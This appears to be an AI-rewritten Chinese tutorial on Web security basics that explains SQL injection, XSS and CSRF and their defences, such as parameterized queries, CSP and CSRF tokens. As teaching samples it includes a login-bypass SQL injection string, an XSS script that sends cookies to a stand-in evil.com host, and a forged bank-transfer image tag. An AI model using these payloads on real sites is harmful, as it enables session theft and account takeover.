---
id: "web-security"
concept: "Web安全基础"
domain: "ai-engineering"
subdomain: "web-backend"
subdomain_name: "Web后端"
difficulty: 4
is_milestone: false
tags: ["security", "xss", "csrf", "injection"]

# Quality Metadata (Schema v2)
content_version: 2
quality_tier: "B"
quality_score: 45.9
generation_method: "ai-rewrite-v1"
unique_content_ratio: 0.452
last_scored: "2026-03-22"
sources:
  - type: "ai-generated"
    model: "claude-sonnet-4-20250514"
    prompt_version: "ai-rewrite-v1"
scorer_version: "scorer-v2.0"
quality_method: intranet-llm-rewrite-v2
updated_at: 2026-03-26
---


# Web安全基础

## 概述

Web安全基础涵盖对Web应用程序最常见攻击向量的识别与防御，核心三类攻击分别为跨站脚本攻击（XSS，Cross-Site Scripting）、跨站请求伪造（CSRF，Cross-Site Request Forgery）和SQL注入（SQL Injection）。这三类攻击在OWASP（开放Web应用安全项目）每年发布的Top 10漏洞榜单中长期占据前列，其中SQL注入自2010年起连续多年排名第一，直至2021年版本被划归为更宽泛的"注入类攻击"类别。

Web安全的历史可追溯到1995年前后，彼时动态网页开始普及。SQL注入攻击由Jeff Forristal于1998年首次正式记录并发表，XSS则在1999年至2000年间被CVE（通用漏洞披露）数据库开始收录。CSRF攻击由Peter Watkins于2001年正式命名，尽管其原理更早就被利用。了解这些攻击的本质，是构建身份验证、会话管理与授权控制体系的前提。

这些攻击之所以危险，在于它们分别攻击"信任链"的不同环节：SQL注入攻击的是服务器对数据库的信任，XSS攻击的是浏览器对服务器下发脚本的信任，CSRF攻击的是服务器对已认证用户请求的信任。

---

## 核心原理

### SQL注入：破坏数据库查询结构

SQL注入的根本原因是将用户输入直接拼接进SQL语句。以登录场景为例，若后端构造查询如下：

```sql
SELECT * FROM users WHERE username = '$input' AND password = '$pwd';
```

攻击者将 `$input` 输入为 `' OR '1'='1' --`，拼接后变成：

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...';
```

`--` 注释掉了密码验证，`OR '1'='1'` 使条件恒为真，攻击者无需密码即可登录。防御的根本方法是使用**参数化查询（Prepared Statements）**，在Python的`psycopg2`中写作：

```python
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```

此时用户输入被视为纯数据而非SQL指令，无论输入什么字符都不会改变查询结构。ORM框架（如Django ORM、SQLAlchemy）默认采用参数化查询，也因此能大幅降低SQL注入风险。

### XSS：在受害者浏览器中执行恶意脚本

XSS分为三种类型：**反射型**（Reflected）、**存储型**（Stored）和**DOM型**（DOM-based）。其中存储型XSS危害最大，攻击者将恶意脚本写入数据库，每次其他用户访问含有该内容的页面时脚本都会执行。典型攻击代码如：

```html
<script>document.location='https://evil.com/steal?c='+document.cookie;</script>
```

此脚本将受害者的Cookie（包括session token）发送至攻击者服务器。防御措施有两层：第一层是**输出编码**，将 `<` 编码为 `&lt;`，`>` 编码为 `&gt;`，使脚本标签无法被浏览器解析为HTML；第二层是设置**Content Security Policy（CSP）**响应头，如：

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

这条CSP策略仅允许加载同源脚本，即使攻击者注入了脚本标签，外部或内联脚本也会被浏览器拦截。此外，为Cookie设置`HttpOnly`标志可使JavaScript无法读取Cookie，从而阻断上述Cookie窃取路径。

### CSRF：借用受害者的身份发起请求

CSRF攻击利用浏览器在跨域请求时会自动携带目标站点Cookie的特性。攻击者构造如下页面：

```html
<img src="https://bank.com/transfer?to=attacker&amount=10000">
```

当已登录bank.com的用户访问此恶意页面，浏览器会自动带上bank.com的session cookie发送该请求，服务器误以为是合法用户操作。

防御CSRF的标准方案是**同步令牌模式（Synchronizer Token Pattern）**：服务器在表单中嵌入一个随机生成的CSRF Token（如32位十六进制字符串），提交时校验该Token是否与服务器端存储的值一致。攻击者无法从跨域页面读取该Token（受同源策略限制），因此伪造请求会因缺少Token而被拒绝。现代框架如Django、Laravel默认在所有POST请求中强制校验CSRF Token。此外，将敏感操作的请求方法设为POST而非GET，以及检查`Origin`/`Referer`请求头，都是辅助防御手段。

---

## 实际应用

**电商平台的商品评论区**是存储型XSS的高发场景。防御策略是在存入数据库前用白名单过滤标签（如仅允许`<b>`、`<i>`），在输出时用HTML实体编码，同时配置CSP头。

**银行转账功能**是CSRF的典型靶点。除CSRF Token外，网银通常还要求用户在关键操作时重新输入密码或短信验证码，这属于二次认证防御层，即使CSRF Token被绕过也能阻止攻击。

**用户注册登录接口**是SQL注入的常见入口。在AI工程后端中，若使用原生SQL查询（如为了性能优化绕过ORM），必须显式使用参数化查询，并对数据库账户实行**最小权限原则**：应用账户只授予SELECT/INSERT/UPDATE权限，不授予DROP TABLE等DDL权限，从而限制SQL注入的破坏范围。

---

## 常见误区

**误区一：前端做了输入过滤，后端就不需要再校验。**
前端校验可以被攻击者用Burp Suite等工具直接绕过，拦截HTTP请求后修改参数，前端的JavaScript过滤逻辑根本不会执行。后端必须独立进行输入验证和输出编码，这是不可省略的防线。

**误区二：HTTPS能防止XSS和CSRF攻击。**
HTTPS加密的是传输信道，防止中间人窃听，但它无法阻止攻击者在受害者浏览器中执行脚本（XSS）或伪造合法用户请求（CSRF）。XSS和CSRF的攻击面在于应用逻辑层，而非传输层。

**误区三：用ORM就完全不用担心SQL注入。**
大多数ORM在使用默认查询方法时确实安全，但当开发者使用ORM的"原生SQL执行"接口（如Django的`raw()`方法或SQLAlchemy的`text()`）且直接拼接字符串时，SQL注入风险依然存在。安全性取决于使用方式，而不是框架选择本身。

---

## 知识关联

学习本主题需要先掌握**Session与Cookie**的工作机制，因为XSS攻击的主要目标正是Cookie中存储的session token，CSRF攻击也依赖浏览器自动发送Cookie的行为。**JWT认证**（属于API认证前置知识）中将token存储在`localStorage`而非Cookie可以避免CSRF，但又引入了XSS可直接读取token的风险，体现了安全设计中的权衡取舍。

掌握本主题后，学习**OAuth与OIDC**时将遇到`state`参数这一机制——它本质上是OAuth流程中专门防止CSRF攻击的令牌，与上文的CSRF Token原理完全一致。OAuth的授权码流程还涉及`redirect_uri`校验，这是防止开放重定向（Open Redirect）漏洞的关键，同属Web安全攻防体系的延伸。